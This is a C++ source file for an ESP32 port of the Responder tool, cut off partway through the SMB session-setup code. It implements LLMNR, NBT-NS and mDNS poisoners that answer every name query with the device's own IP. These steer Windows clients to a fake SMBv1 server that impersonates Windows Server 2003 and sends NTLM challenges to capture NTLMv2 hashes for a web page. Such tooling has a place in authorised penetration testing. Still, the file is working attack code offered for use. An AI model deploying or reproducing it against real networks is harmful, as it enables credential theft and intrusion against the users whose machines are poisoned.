// rESPonder32 — Integration sketch
//
// Combines all modules into a single FreeRTOS task-per-server sketch:
//   task_llmnr  — UDP multicast 224.0.0.252:5355
//   task_nbtns  — UDP broadcast 0.0.0.0:137
//   task_mdns   — UDP multicast 224.0.0.251:5353
//   task_smb    — TCP 445 (NTLM hash capture via fake SMBv1)
//   task_http   — TCP 80  (NTLM hash capture via fake HTTP NTLM)
//   task_web    — WebServer 8080, /hashes and /
//
// Each poisoner replies to every name query with g_ourIP, steering Windows
// clients to the fake SMB/HTTP endpoints where NTLMv2 hashes are captured.
//
// Port 137 and 445 require root on Linux; both tasks emit a warning and exit
// gracefully if the bind fails.
//
// Packet formats and field values taken field-by-field from:
//   Responder/packets.py, servers/SMB.py, servers/HTTP.py, utils/NTLM.py
//   (https://github.com/lgandx/Responder)

#include <Arduino.h>
#include <WiFi.h>
#include <WiFiUDP.h>
#include <WiFiServer.h>
#include <WiFiClient.h>
#include <WebServer.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/semphr.h>
#include <esp_random.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <poll.h>
#include <unistd.h>
#include <cstring>
#include <cstdio>
#include <cstdlib>
#include <string>
#include <vector>

#include "hash_formatter.h"

// ---------------------------------------------------------------------------
// Config — edit before flashing
// ---------------------------------------------------------------------------

static const char*    WIFI_SSID = "YourSSID";
static const char*    WIFI_PASS = "YourPassword";

// SMB AvPairs / NTLM target identity advertised to clients.
// Windows never verifies these against DNS.
static const char*    SMB_DOMAIN      = "WORKGROUP";
static const char*    SMB_MACHINE     = "FILESERVER01";
static const char*    SMB_DOMAIN_NAME = "workgroup.local";

// HTTP server NTLM TargetName. "SMB" matches Responder default.
static const char     HTTP_SERVER_NAME[] = "SMB";

// ---------------------------------------------------------------------------
// Global state
// ---------------------------------------------------------------------------

static uint8_t           g_ourIP[4]       = {127, 0, 0, 1};
static uint8_t           g_smbChallenge[8];
static uint8_t           g_httpChallenge[8];
static SemaphoreHandle_t g_hashMutex      = nullptr;
static std::vector<std::string> g_capturedHashes;
static WebServer         g_webServer(8080);

// ---------------------------------------------------------------------------
// Shared helper: host IP detection
//
// Connects a UDP socket to 8.8.8.8:53 (no traffic sent) and reads back the
// kernel-selected local address. Works on POSIX and in the emulator.
// ---------------------------------------------------------------------------

static void detectHostIP(uint8_t out[4]) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return;

    struct sockaddr_in dst{};
    dst.sin_family = AF_INET;
    dst.sin_port   = htons(53);
    inet_pton(AF_INET, "8.8.8.8", &dst.sin_addr);

    if (connect(s, (struct sockaddr*)&dst, sizeof(dst)) == 0) {
        struct sockaddr_in local{};
        socklen_t len = sizeof(local);
        if (getsockname(s, (struct sockaddr*)&local, &len) == 0) {
            uint8_t* b = (uint8_t*)&local.sin_addr.s_addr;
            out[0] = b[0]; out[1] = b[1]; out[2] = b[2]; out[3] = b[3];
        }
    }
    close(s);
}

// ---------------------------------------------------------------------------
// Thread-safe hash storage
// ---------------------------------------------------------------------------

static void addCapturedHash(const char* h) {
    if (g_hashMutex) xSemaphoreTake(g_hashMutex, portMAX_DELAY);
    g_capturedHashes.push_back(std::string(h));
    if (g_hashMutex) xSemaphoreGive(g_hashMutex);
    Serial.printf("[HASH] %s\n", h);
}

// ===========================================================================
// LLMNR (RFC 4795) — UDP multicast 224.0.0.252:5355
// ===========================================================================

// Parse a DNS-wire-format name starting at buf[offset].
// Writes dotted-label form into name_out. Returns bytes consumed (including
// the terminal 0x00), or -1 on malformed input.
// Used by both LLMNR and mDNS (parseDnsName is a shared implementation).
static int parseDnsName(const uint8_t* buf, int len, int offset,
                        char* name_out, int name_max) {
    int pos   = offset;
    int out   = 0;
    bool first = true;

    while (pos < len) {
        uint8_t label_len = buf[pos++];
        if (label_len == 0) break;
        if (label_len > 63) return -1;
        if (pos + label_len > len) return -1;

        if (!first && out < name_max - 1) name_out[out++] = '.';
        for (int i = 0; i < label_len && out < name_max - 1; i++)
            name_out[out++] = (char)buf[pos + i];

        pos  += label_len;
        first = false;
    }
    name_out[out] = '\0';
    return pos - offset;
}

// Build LLMNR A-record response into dst.
// Responder LLMNR_Ans: flags=0x8000, TTL=30, echoes question, one A answer.
// Returns bytes written or -1.
static int buildLLMNRResponse(const uint8_t* query, int qlen,
                               uint8_t* dst,   int dstmax,
                               const uint8_t* our_ip4) {
    if (qlen < 12) return -1;

    uint16_t txid  = ((uint16_t)query[0] << 8) | query[1];
    uint16_t flags = ((uint16_t)query[2] << 8) | query[3];
    uint16_t qdcnt = ((uint16_t)query[4] << 8) | query[5];

    // Responder: data[2:4] == b'\x00\x00' — Windows sends exactly 0x0000.
    if (flags != 0x0000) return -1;
    if (qdcnt == 0)      return -1;

    char dummy[256];
    int name_bytes = parseDnsName(query, qlen, 12, dummy, sizeof(dummy));
    if (name_bytes < 0) return -1;

    int qtype_off = 12 + name_bytes;
    if (qtype_off + 4 > qlen) return -1;

    uint16_t qtype = ((uint16_t)query[qtype_off] << 8) | query[qtype_off + 1];
    if (qtype != 0x0001) return -1;  // A only

    int qsec_len = name_bytes + 4;

    int w = 0;
    auto put16 = [&](uint16_t v) {
        if (w + 2 <= dstmax) { dst[w++] = (uint8_t)(v >> 8); dst[w++] = (uint8_t)(v & 0xFF); }
    };
    auto putBuf = [&](const uint8_t* src, int n) {
        for (int i = 0; i < n && w < dstmax; i++) dst[w++] = src[i];
    };

    put16(txid);    // Transaction ID echoed
    put16(0x8000);  // QR=1, all else 0
    put16(1);       // QDCOUNT = 1
    put16(1);       // ANCOUNT = 1
    put16(0);       // NSCOUNT = 0
    put16(0);       // ARCOUNT = 0

    putBuf(query + 12, qsec_len);    // echo question section

    putBuf(query + 12, name_bytes);  // answer name
    put16(0x0001);  // TYPE = A
    put16(0x0001);  // CLASS = IN
    put16(0x0000);  // TTL high word
    put16(30);      // TTL = 30 s (Responder LLMNR_Ans)
    put16(4);       // RDLENGTH = 4
    putBuf(our_ip4, 4);

    return w;
}

static void task_llmnr(void* pv) {
    (void)pv;

    static const IPAddress LLMNR_MCAST(224, 0, 0, 252);
    static const uint16_t  LLMNR_PORT = 5355;

    WiFiUDP udp;
    if (!udp.beginMulticast(LLMNR_MCAST, LLMNR_PORT)) {
        Serial.println("[LLMNR] ERROR: failed to bind 224.0.0.252:5355");
        vTaskDelete(NULL);
        return;
    }
    Serial.println("[LLMNR] Listening on 224.0.0.252:5355");

    for (;;) {
        int n = udp.parsePacket();
        if (n > 0) {
            uint8_t buf[512];
            int r = udp.read(buf, sizeof(buf));
            if (r >= 12) {
                IPAddress src     = udp.remoteIP();
                uint16_t  srcPort = udp.remotePort();

                char name[256] = "(unknown)";
                parseDnsName(buf, r, 12, name, sizeof(name));

                uint16_t flags = ((uint16_t)buf[2] << 8) | buf[3];
                if (flags == 0x0000) {
                    Serial.printf("[LLMNR] Query from %d.%d.%d.%d:%d for '%s'\n",
                                  src[0], src[1], src[2], src[3], srcPort, name);

                    uint8_t resp[512];
                    int rlen = buildLLMNRResponse(buf, r, resp, sizeof(resp), g_ourIP);
                    if (rlen > 0) {
                        udp.beginPacket(src, srcPort);
                        udp.write(resp, (size_t)rlen);
                        udp.endPacket();
                        Serial.printf("[LLMNR] Poisoned -> %d.%d.%d.%d\n",
                                      g_ourIP[0], g_ourIP[1], g_ourIP[2], g_ourIP[3]);
                    }
                }
            }
        }
        vTaskDelay(1 / portTICK_PERIOD_MS);
    }
}

// ===========================================================================
// NBT-NS (RFC 1001/1002) — UDP broadcast 0.0.0.0:137
// ===========================================================================

// Decode the 32-byte first-level encoded NetBIOS name at buf[offset].
// Returns false if the length prefix is wrong or data is short.
static bool decodeNBTName(const uint8_t* buf, int len, int offset,
                           char decoded[17]) {
    if (offset >= len) return false;
    if (buf[offset] != 0x20) return false;
    if (offset + 1 + 32 + 1 > len) return false;

    const uint8_t* enc = buf + offset + 1;
    for (int i = 0; i < 16; i++) {
        uint8_t hi = enc[i * 2]     - 'A';
        uint8_t lo = enc[i * 2 + 1] - 'A';
        decoded[i] = (char)((hi << 4) | lo);
    }
    decoded[16] = '\0';
    return true;
}

// Build a human-readable version of a decoded NBT name into out[20].
// Trims trailing spaces; appends the suffix byte as <XX>.
static void prettyNBTName(const char decoded[17], char out[20]) {
    int end = 14;
    while (end > 0 && decoded[end] == ' ') end--;
    int i = 0;
    for (; i <= end; i++) out[i] = decoded[i];
    snprintf(out + i, 20 - i, "<%02X>", (uint8_t)decoded[15]);
}

// Build NBT-NS Positive Name Query Response into dst.
// Responder NBT_Ans: flags=0x8500, QDCOUNT=0, TTL=300000, NB_FLAGS=0x0000.
// Returns bytes written or -1.
static int buildNBTNSResponse(const uint8_t* query, int qlen,
                               uint8_t* dst,  int dstmax,
                               const uint8_t* our_ip4) {
    if (qlen < 12) return -1;

    uint16_t flags = ((uint16_t)query[2] << 8) | query[3];

    // Responder: data[2:4] == b'\x01\x10' exactly — broadcast query from Windows.
    if (flags != 0x0110) return -1;

    // Name starts at byte 12; must be 0x20 (32-byte encoded NetBIOS name).
    if (qlen < 12 + 34 + 4) return -1;
    if (query[12] != 0x20) return -1;

    static const int NAME_WIRE_LEN = 34;
    int qtype_off = 12 + NAME_WIRE_LEN;
    if (qtype_off + 4 > qlen) return -1;

    uint16_t qtype = ((uint16_t)query[qtype_off] << 8) | query[qtype_off + 1];
    if (qtype != 0x0020) return -1;  // NB only

    int w = 0;
    auto put16 = [&](uint16_t v) {
        if (w + 2 <= dstmax) { dst[w++] = (uint8_t)(v >> 8); dst[w++] = (uint8_t)(v & 0xFF); }
    };
    auto put32 = [&](uint32_t v) {
        put16((uint16_t)(v >> 16)); put16((uint16_t)(v & 0xFFFF));
    };
    auto putBuf = [&](const uint8_t* src, int n) {
        for (int i = 0; i < n && w < dstmax; i++) dst[w++] = src[i];
    };

    dst[w++] = query[0]; dst[w++] = query[1];  // Transaction ID echoed
    put16(0x8500);       // QR=1, AA=1, RCODE=0
    put16(0);            // QDCOUNT = 0
    put16(1);            // ANCOUNT = 1
    put16(0);            // NSCOUNT = 0
    put16(0);            // ARCOUNT = 0

    putBuf(query + 12, NAME_WIRE_LEN);  // answer name verbatim
    put16(0x0020);       // TYPE = NB
    put16(0x0001);       // CLASS = IN
    put32(0x000493E0);   // TTL = 300000 s
    put16(6);            // RDLENGTH = 6
    put16(0x0000);       // NB_FLAGS: unique, B-node
    putBuf(our_ip4, 4);

    return w;
}

static void task_nbtns(void* pv) {
    (void)pv;

    static const uint16_t NBTNS_PORT = 137;

    WiFiUDP udp;
    if (!udp.beginLAN(NBTNS_PORT)) {
        Serial.println("[NBT-NS] WARN: failed to bind port 137 (need root?)");
        Serial.println("[NBT-NS] NBT-NS poisoner disabled");
        vTaskDelete(NULL);
        return;
    }
    Serial.println("[NBT-NS] Listening on 0.0.0.0:137");

    for (;;) {
        int n = udp.parsePacket();
        if (n > 0) {
            uint8_t buf[512];
            int r = udp.read(buf, sizeof(buf));
            if (r >= 12) {
                IPAddress src     = udp.remoteIP();
                uint16_t  srcPort = udp.remotePort();

                uint16_t flags = ((uint16_t)buf[2] << 8) | buf[3];
                if (flags == 0x0110) {
                    char decoded[17] = {};
                    char pretty[20]  = "(unknown)";
                    if (decodeNBTName(buf, r, 12, decoded))
                        prettyNBTName(decoded, pretty);

                    Serial.printf("[NBT-NS] Query from %d.%d.%d.%d:%d for '%s'\n",
                                  src[0], src[1], src[2], src[3], srcPort, pretty);

                    uint8_t resp[512];
                    int rlen = buildNBTNSResponse(buf, r, resp, sizeof(resp), g_ourIP);
                    if (rlen > 0) {
                        udp.beginPacket(src, srcPort);
                        udp.write(resp, (size_t)rlen);
                        udp.endPacket();
                        Serial.printf("[NBT-NS] Poisoned -> %d.%d.%d.%d\n",
                                      g_ourIP[0], g_ourIP[1], g_ourIP[2], g_ourIP[3]);
                    }
                }
            }
        }
        vTaskDelay(1 / portTICK_PERIOD_MS);
    }
}

// ===========================================================================
// mDNS (RFC 6762) — UDP multicast 224.0.0.251:5353
// ===========================================================================

// Build mDNS A-record response into dst.
// Critical differences from LLMNR (Responder MDNS_Ans):
//   TxID = 0x0000 always, flags = 0x8400 (QR+AA), QDCOUNT = 0, TTL = 120.
//   Answer name = query[12..qlen-5] plus a null label appended here.
// Returns bytes written or -1.
static int buildMDNSResponse(const uint8_t* query, int qlen,
                              uint8_t* dst,   int dstmax,
                              const uint8_t* our_ip4) {
    if (qlen < 12) return -1;

    uint16_t flags = ((uint16_t)query[2] << 8) | query[3];
    if (flags & 0x8000) return -1;  // mDNS response, not a query — ignore

    uint16_t qdcnt = ((uint16_t)query[4] << 8) | query[5];
    if (qdcnt == 0) return -1;

    char dummy[256];
    int name_bytes = parseDnsName(query, qlen, 12, dummy, sizeof(dummy));
    if (name_bytes < 0) return -1;

    int qtype_off = 12 + name_bytes;
    if (qtype_off + 4 > qlen) return -1;

    uint16_t qtype = ((uint16_t)query[qtype_off] << 8) | query[qtype_off + 1];
    if (qtype != 0x0001) return -1;  // A only

    // Responder: AnswerName = data[12:] then data[:len(data)-5]
    int ans_name_len = qlen - 12 - 5;
    if (ans_name_len <= 0) return -1;

    int w = 0;
    auto put16 = [&](uint16_t v) {
        if (w + 2 <= dstmax) { dst[w++] = (uint8_t)(v >> 8); dst[w++] = (uint8_t)(v & 0xFF); }
    };
    auto put32 = [&](uint32_t v) {
        put16((uint16_t)(v >> 16)); put16((uint16_t)(v & 0xFFFF));
    };
    auto putBuf = [&](const uint8_t* src, int n) {
        for (int i = 0; i < n && w < dstmax; i++) dst[w++] = src[i];
    };

    put16(0x0000);  // Transaction ID: always 0 in mDNS
    put16(0x8400);  // QR=1, AA=1
    put16(0);       // QDCOUNT = 0
    put16(1);       // ANCOUNT = 1
    put16(0);       // NSCOUNT = 0
    put16(0);       // ARCOUNT = 0

    putBuf(query + 12, ans_name_len);
    if (w < dstmax) dst[w++] = 0x00;  // restore the null label that was stripped

    put16(0x0001);       // TYPE = A
    put16(0x0001);       // CLASS = IN
    put32(0x00000078);   // TTL = 120 s
    put16(4);            // RDLENGTH = 4
    putBuf(our_ip4, 4);

    return w;
}

static void task_mdns(void* pv) {
    (void)pv;

    static const IPAddress MDNS_MCAST(224, 0, 0, 251);
    static const uint16_t  MDNS_PORT = 5353;

    WiFiUDP udp;
    if (!udp.beginMulticast(MDNS_MCAST, MDNS_PORT)) {
        Serial.println("[mDNS] ERROR: failed to bind 224.0.0.251:5353");
        vTaskDelete(NULL);
        return;
    }
    Serial.println("[mDNS] Listening on 224.0.0.251:5353");

    for (;;) {
        int n = udp.parsePacket();
        if (n > 0) {
            uint8_t buf[512];
            int r = udp.read(buf, sizeof(buf));
            if (r >= 12) {
                IPAddress src     = udp.remoteIP();
                uint16_t  srcPort = udp.remotePort();

                uint16_t flags = ((uint16_t)buf[2] << 8) | buf[3];
                if (!(flags & 0x8000)) {
                    char name[256] = "(unknown)";
                    parseDnsName(buf, r, 12, name, sizeof(name));

                    Serial.printf("[mDNS] Query from %d.%d.%d.%d:%d for '%s'\n",
                                  src[0], src[1], src[2], src[3], srcPort, name);

                    uint8_t resp[512];
                    int rlen = buildMDNSResponse(buf, r, resp, sizeof(resp), g_ourIP);
                    if (rlen > 0) {
                        udp.beginPacket(src, srcPort);
                        udp.write(resp, (size_t)rlen);
                        udp.endPacket();
                        Serial.printf("[mDNS] Poisoned -> %d.%d.%d.%d\n",
                                      g_ourIP[0], g_ourIP[1], g_ourIP[2], g_ourIP[3]);
                    }
                }
            }
        }
        vTaskDelay(1 / portTICK_PERIOD_MS);
    }
}

// ===========================================================================
// SMB helpers shared between negotiate and session-setup builders
// ===========================================================================

// Read exactly n bytes from a socket fd with poll-based blocking.
static int recvAll(int fd, uint8_t* buf, int n, int timeout_ms = 5000) {
    int got = 0;
    while (got < n) {
        struct pollfd pfd{ fd, POLLIN, 0 };
        int r = poll(&pfd, 1, timeout_ms);
        if (r <= 0) return -1;
        int chunk = recv(fd, buf + got, n - got, 0);
        if (chunk <= 0) return -1;
        got += chunk;
    }
    return got;
}

// Write all bytes; returns false on short write.
static bool sendAll(int fd, const uint8_t* buf, int n) {
    int sent = 0;
    while (sent < n) {
        int r = ::send(fd, buf + sent, n - sent, 0);
        if (r <= 0) return false;
        sent += r;
    }
    return true;
}

// Read one NetBIOS Session Service framed SMB PDU.
// Handles the optional 0x81 NetBIOS Session Request that some clients send first.
static int recvSMBPDU(int fd, uint8_t* buf, int bufsz) {
    for (;;) {
        uint8_t hdr[4];
        if (recvAll(fd, hdr, 4) < 0) return -1;

        if (hdr[0] == 0x81) {
            uint32_t slen = ((uint32_t)hdr[1] << 16) | ((uint32_t)hdr[2] << 8) | hdr[3];
            uint8_t tmp[256];
            recvAll(fd, tmp, (int)(slen < sizeof(tmp) ? slen : sizeof(tmp)));
            uint8_t pos_resp[4] = { 0x82, 0x00, 0x00, 0x00 };
            sendAll(fd, pos_resp, 4);
            continue;
        }

        if (hdr[0] != 0x00) return -1;
        uint32_t plen = ((uint32_t)hdr[1] << 16) | ((uint32_t)hdr[2] << 8) | hdr[3];
        if ((int)plen > bufsz) return -1;
        if (recvAll(fd, buf, (int)plen) < 0) return -1;
        return (int)plen;
    }
}

// Wrap payload in a 4-byte NetBIOS Session Service header and send.
static bool sendSMBPDU(int fd, const uint8_t* payload, int plen) {
    uint8_t hdr[4];
    hdr[0] = 0x00;
    hdr[1] = (uint8_t)((plen >> 16) & 0xFF);
    hdr[2] = (uint8_t)((plen >>  8) & 0xFF);
    hdr[3] = (uint8_t)( plen        & 0xFF);
    if (!sendAll(fd, hdr, 4)) return false;
    return sendAll(fd, payload, plen);
}

// Encode s into UTF-16LE; returns bytes written.
static int encodeUTF16LE(const char* s, uint8_t* dst, int dstmax) {
    int w = 0;
    for (int i = 0; s[i] && w + 2 <= dstmax; i++) {
        dst[w++] = (uint8_t)s[i];
        dst[w++] = 0x00;
    }
    return w;
}

// Append a little-endian NTLMSSP AvPair (id + UTF-16LE value) into buf[*pos].
static bool appendSMBAvPair(uint8_t* buf, int bufsz, int* pos,
                             uint16_t avid, const char* value_utf8) {
    uint8_t tmp[256];
    int vlen = encodeUTF16LE(value_utf8, tmp, sizeof(tmp));
    if (*pos + 4 + vlen > bufsz) return false;
    buf[(*pos)++] = (uint8_t)(avid & 0xFF);
    buf[(*pos)++] = (uint8_t)(avid >> 8);
    buf[(*pos)++] = (uint8_t)(vlen & 0xFF);
    buf[(*pos)++] = (uint8_t)(vlen >> 8);
    memcpy(buf + *pos, tmp, vlen);
    *pos += vlen;
    return true;
}

// Build a raw NTLMSSP Type 2 Challenge message for the SMB path.
// Matches packets.py SMBSession1Data / NTLMChallenge field-by-field.
// Returns bytes written or -1.
static int buildSMBNTLMChallenge(uint8_t* buf, int bufsz,
                                  const uint8_t challenge[8]) {
    if (bufsz < 256) return -1;

    // Build AvPairs block first so we know its length before writing the header.
    uint8_t avpairs[256];
    int avlen = 0;

    // AvPairs order from packets.py:
    //   MsvAvNbDomainName  (0x0002)
    //   MsvAvNbComputerName (0x0001)
    //   MsvAvDnsDomainName  (0x0004)
    //   MsvAvDnsComputerName (0x0003)
    //   MsvAvDnsTreeName    (0x0005)
    //   MsvAvEOL            (0x0000)
    appendSMBAvPair(avpairs, sizeof(avpairs), &avlen, 0x0002, SMB_DOMAIN);
    appendSMBAvPair(avpairs, sizeof(avpairs), &avlen, 0x0001, SMB_MACHINE);
    appendSMBAvPair(avpairs, sizeof(avpairs), &avlen, 0x0004, SMB_DOMAIN_NAME);
    {
        // DnsComputerName = MACHINE.domain_name
        char fqdn[128];
        snprintf(fqdn, sizeof(fqdn), "%s.%s", SMB_MACHINE, SMB_DOMAIN_NAME);
        appendSMBAvPair(avpairs, sizeof(avpairs), &avlen, 0x0003, fqdn);
    }
    appendSMBAvPair(avpairs, sizeof(avpairs), &avlen, 0x0005, SMB_DOMAIN_NAME);
    if (avlen + 4 > (int)sizeof(avpairs)) return -1;
    avpairs[avlen++] = 0x00; avpairs[avlen++] = 0x00;
    avpairs[avlen++] = 0x00; avpairs[avlen++] = 0x00;

    // TargetName = SMB_DOMAIN as UTF-16LE
    uint8_t wsname[64];
    int wslen = encodeUTF16LE(SMB_DOMAIN, wsname, sizeof(wsname));

    // Fixed header: signature(8) + MsgType(4) + TargetNameFields(8)
    //   + NegFlags(4) + ServerChallenge(8) + Reserved(8)
    //   + TargetInfoFields(8) + Version(8) = 56 bytes
    static const int NTLM_HDR = 56;
    int wsoff  = NTLM_HDR;
    int avoff  = wsoff + wslen;
    int total  = avoff + avlen;

    if (total > bufsz) return -1;

    int w = 0;
    auto put8  = [&](uint8_t v)  { buf[w++] = v; };
    auto put16 = [&](uint16_t v) { buf[w++] = v & 0xFF; buf[w++] = v >> 8; };   // LE
    auto put32 = [&](uint32_t v) {
        buf[w++] = v & 0xFF; buf[w++] = (v >> 8) & 0xFF;
        buf[w++] = (v >> 16) & 0xFF; buf[w++] = (v >> 24) & 0xFF;
    };

    const char* sig = "NTLMSSP";
    for (int i = 0; i < 7; i++) put8((uint8_t)sig[i]);
    put8(0x00);

    put32(0x00000002);  // MessageType = CHALLENGE

    put16((uint16_t)wslen);   // TargetNameLen
    put16((uint16_t)wslen);   // TargetNameMaxLen
    put32((uint32_t)wsoff);   // TargetNameOffset

    // NegotiateFlags from packets.py SMBSession1Data.NTLMSSPNtNegotiateFlags
    put8(0x15); put8(0x82); put8(0x89); put8(0xe2);

    for (int i = 0; i < 8; i++) put8(challenge[i]);  // ServerChallenge
    for (int i = 0; i < 8; i++) put8(0x00);          // Reserved

    put16((uint16_t)avlen);   // TargetInfoLen
    put16((uint16_t)avlen);   // TargetInfoMaxLen
    put32((uint32_t)avoff);   // TargetInfoOffset

    // Version from packets.py SMBSession1Data: 05 02 ce 0e 00 00 00 0f
    put8(0x05); put8(0x02); put8(0xce); put8(0x0e);
    put8(0x00); put8(0x00); put8(0x00); put8(0x0f);

    memcpy(buf + w, wsname,  wslen); w += wslen;
    memcpy(buf + w, avpairs, avlen); w += avlen;

    return w;
}

// Wrap an NTLMSSP message in the minimal SPNEGO / GSSAPI NegTokenResp envelope
// that Windows expects in an SMB Session Setup response.
// Layout matches SMBSession1Data.calculate() from packets.py.
// Returns bytes written or -1.
static int wrapInSPNEGO(const uint8_t* ntlm, int ntlmlen,
                         uint8_t* out, int outsz) {
    static const uint8_t NTLMSSP_OID[] = {
        0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a
    };
    static const int OID_LEN = 10;

    bool ntlm_needs_2byte  = (ntlmlen > 127);
    int  tag3_content_len  = ntlm_needs_2byte ? 3 + ntlmlen : 2 + ntlmlen;

    int  tag2_inner        = tag3_content_len > 127 ? 3 + tag3_content_len : 2 + tag3_content_len;

    int  tag1_len          = 2 + 2 + OID_LEN;   // a1 len 06 oidlen oid
    int  tag0_len          = 5;                  // a0 03 0a 01 01

    int  negtoken_inner    = tag0_len + tag1_len + tag2_inner;
    int  seq_len           = negtoken_inner;
    bool seq_needs_2byte   = (seq_len > 127);

    int  choice_inner      = 2 + (seq_needs_2byte ? 3 : 2) + seq_len;
    bool choice_needs_2byte = (choice_inner > 127);

    int total = 2 + (choice_needs_2byte ? 3 : 2) + choice_inner;
    if (total > outsz) return -1;

    int w = 0;
    auto put8   = [&](uint8_t v) { out[w++] = v; };
    auto putLen = [&](int n) {
        if (n > 127) { put8(0x81); put8((uint8_t)n); }
        else         { put8((uint8_t)n); }
    };

    put8(0xa1); putLen(choice_inner);   // NegTokenResp choice tag
    put8(0x30); putLen(seq_len);        // SEQUENCE
    put8(0xa0); put8(0x03); put8(0x0a); put8(0x01); put8(0x01);  // negState=accept-incomplete
    put8(0xa1); put8((uint8_t)(2 + OID_LEN));
    put8(0x06); put8((uint8_t)OID_LEN);
    for (int i = 0; i < OID_LEN; i++) put8(NTLMSSP_OID[i]);
    put8(0xa2); putLen(tag3_content_len);
    put8(0x04); putLen(ntlmlen);
    memcpy(out + w, ntlm, ntlmlen); w += ntlmlen;

    return w;
}

// Build the 32-byte SMBv1 header.
// Field order from packets.py SMBHeader; all multi-byte fields are LE.
static int buildSMBHeader(uint8_t* buf, int bufsz,
                           uint8_t cmd, uint8_t flag1, uint16_t flag2,
                           uint32_t errorcode,
                           uint16_t pid, uint16_t uid,
                           uint16_t tid, uint16_t mid) {
    if (bufsz < 32) return -1;
    int w = 0;

    buf[w++] = 0xFF; buf[w++] = 'S'; buf[w++] = 'M'; buf[w++] = 'B';
    buf[w++] = cmd;
    buf[w++] = (uint8_t)(errorcode & 0xFF);
    buf[w++] = (uint8_t)((errorcode >>  8) & 0xFF);
    buf[w++] = (uint8_t)((errorcode >> 16) & 0xFF);
    buf[w++] = (uint8_t)((errorcode >> 24) & 0xFF);
    buf[w++] = flag1;
    buf[w++] = (uint8_t)(flag2 & 0xFF);
    buf[w++] = (uint8_t)(flag2 >> 8);
    buf[w++] = 0x00; buf[w++] = 0x00;        // PID High
    for (int i = 0; i < 8; i++) buf[w++] = 0x00;  // Signature
    buf[w++] = 0x00; buf[w++] = 0x00;        // Reserved
    buf[w++] = (uint8_t)(tid & 0xFF); buf[w++] = (uint8_t)(tid >> 8);
    buf[w++] = (uint8_t)(pid & 0xFF); buf[w++] = (uint8_t)(pid >> 8);
    buf[w++] = (uint8_t)(uid & 0xFF); buf[w++] = (uint8_t)(uid >> 8);
    buf[w++] = (uint8_t)(mid & 0xFF); buf[w++] = (uint8_t)(mid >> 8);

    return w;  // always 32
}

// Build SMB Negotiate Protocol Response (0x72).
// Matches SMBNegoKerbAns from packets.py; advertises NT LM 0.12 with SPNEGO
// blob so the client goes straight to NTLMSSP session setup.
static int buildNegotiateResponse(const uint8_t* query, int qlen,
                                   uint8_t* dst,  int dstsz,
                                   const uint8_t challenge[8]) {
    if (qlen < 36) return -1;

    uint16_t pid = (uint16_t)query[30] | ((uint16_t)query[31] << 8);
    uint16_t mid = (uint16_t)query[34] | ((uint16_t)query[35] << 8);

    // Find "NT LM 0.12" in the dialect list (starts at query[39]).
    int dialect_idx = 0;
    {
        int pos = 39;
        int idx = 0;
        while (pos < qlen) {
            if (query[pos] != 0x02) { pos++; continue; }
            pos++;
            const char* start = (const char*)(query + pos);
            int slen = 0;
            while (pos + slen < qlen && query[pos + slen] != 0x00) slen++;
            if (slen == 10 && memcmp(start, "NT LM 0.12", 10) == 0)
                dialect_idx = idx;
            pos += slen + 1;
            idx++;
        }
    }

    uint8_t ntlm[512];
    int ntlmlen = buildSMBNTLMChallenge(ntlm, sizeof(ntlm), challenge);
    if (ntlmlen < 0) return -1;

    uint8_t spnego[700];
    int spnegolen = wrapInSPNEGO(ntlm, ntlmlen, spnego, sizeof(spnego));
    if (spnegolen < 0) return -1;

    uint8_t body[1024];
    int bw = 0;
    auto bput8  = [&](uint8_t v)  { if (bw < (int)sizeof(body)) body[bw++] = v; };
    auto bput16 = [&](uint16_t v) { bput8(v & 0xFF); bput8(v >> 8); };
    auto bput32 = [&](uint32_t v) {
        bput8(v & 0xFF); bput8((v >> 8) & 0xFF);
        bput8((v >> 16) & 0xFF); bput8((v >> 24) & 0xFF);
    };

    bput8(0x11);                          // WordCount = 17
    bput16((uint16_t)dialect_idx);        // DialectIndex
    bput8(0x03);                          // SecurityMode
    bput16(0x0032);                       // MaxMpxCount = 50
    bput8(0x01);                          // MaxCountLow = 1
    bput32(0x00040000);                   // MaxRawBuffer
    bput32(0x00000000);                   // SessionKey
    bput8(0xfd); bput8(0xe3); bput8(0x00); bput8(0x80);  // Capabilities
    for (int i = 0; i < 8; i++) bput8(0x00);  // SystemTime
    bput16(0xffff);                       // TimeZone
    bput16((uint16_t)spnegolen);          // SecurityBlobLength
    bput8(0x00);                          // Reserved before ByteCount
    bput16((uint16_t)spnegolen);          // ByteCount

    if (bw + spnegolen > (int)sizeof(body)) return -1;
    memcpy(body + bw, spnego, spnegolen);
    bw += spnegolen;

    if (32 + bw > dstsz) return -1;
    int hw = buildSMBHeader(dst, dstsz, 0x72, 0x88, 0x01c8,
                             0x00000000, pid, 0, 0, mid);
    if (hw < 0) return -1;
    memcpy(dst + hw, body, bw);
    return hw + bw;
}

// Build SMB Session Setup AndX Response (0x73) with STATUS_MORE_PROCESSING_REQUIRED.
// Carries our NTLMSSP Type 2 challenge. Matches SMBSession1Data from packets.py.
static int buildSessionSetupChallenge(const uint8_t* query, int qlen,
                                       uint8_t* dst,  int dstsz,
                                       const uint8_t challenge[8]) {
    if (qlen < 36) return -1;

    uint16_t pid = (uint16_t)query[30] | ((uint16_t)query[31] << 8);
    uint16_t mid = (uint16_t)query[34] | ((uint16_t)query[35] << 8);
    uint16_t uid = (uint16_t)(esp_random() & 0xFFFF);
    if (uid == 0) uid = 0x0100;

    uint8_t ntlm[512];
    int ntlmlen = buildSMBNTLMChallenge(ntlm, sizeof(ntlm), challenge);
    if (ntlmlen < 0) return -1;

    uint8_t spnego[700];
    int spnegolen = wrapInSPNEGO(ntlm, ntlmlen, spnego, sizeof(spnego));
    if (spnegolen < 0) return -1;

    // NativeOS and NativeLAN (UTF-16LE) from packets.py SMBSession1Data
    uint8_t nativeos[128], nativelan[64];
    int noslen  = encodeUTF16LE("Windows Server 2003 3790 Service Pack 2",
                                 nativeos, sizeof(nativeos));
    int nlanlen = encodeUTF16LE("Windows Server 2003 5.2",
                                 nativelan, sizeof(nativelan));

    int bcc = spnegolen + noslen + 2 + nlanlen + 2;

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Warray-bounds"
#pragma GCC diagnostic ignored "-Wstringop-overflow"
    uint8_t body[3072];
    int bw = 0;
